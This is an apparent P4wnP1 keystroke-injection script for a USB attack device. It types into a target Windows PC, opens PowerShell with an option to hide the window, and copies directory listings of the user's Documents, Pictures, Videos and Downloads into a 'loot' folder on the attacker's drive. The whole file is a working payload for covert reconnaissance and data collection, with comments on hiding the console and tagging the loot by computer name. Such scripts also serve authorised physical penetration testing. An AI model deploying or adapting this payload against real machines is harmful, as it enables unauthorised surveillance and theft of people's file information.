//You need HID Keyboard and USB Mass Storage enabled under USB SETTINGS

layout("gb-2");			//Keyboard layout
hide=false; 			//Set to true to hide the console window on the target
exit=false;				//Set to true to exit the console once finished

typingSpeed(0,0);		//Typing as fast as possible
press("GUI r");
delay(500);
if (hide) type("powershell -w h -NoP -NonI\n"); else type("powershell\n"); //Hide the console if chosen to do so
delay(1000);
type("$usbPath =((gwmi win32_volume -f 'label=''P4WNP1''').Name)\n");	   //Replace 'P4WNP1' with your drive name
delay(100);
type("tree /F /A $env:USERPROFILE\\Documents > $usbPath\\loot\\$env:COMPUTERNAME-Documents_Dir.txt;tree /F /A $env:USERPROFILE\\Pictures > $usbPath\\loot\\$env:COMPUTERNAME-Pictures_Dir.txt;tree /F /A $env:USERPROFILE\\Videos > $usbPath\\loot\\$env:COMPUTERNAME-Videos_Dir.txt;tree /F /A $env:USERPROFILE\\Downloads > $usbPath\\loot\\$env:COMPUTERNAME-Downloads_Dir.txt\n");
//env:USERPROFILE returns the default directory where Documents, Pictures, Downloads, etc reside
//Using $env:COMPUTERNAME- so files from different computers don't get overwrote
//Stores outputs in loot folder on drive
if (exit) { type("exit\n"); } //Exit the console if chosen to do so
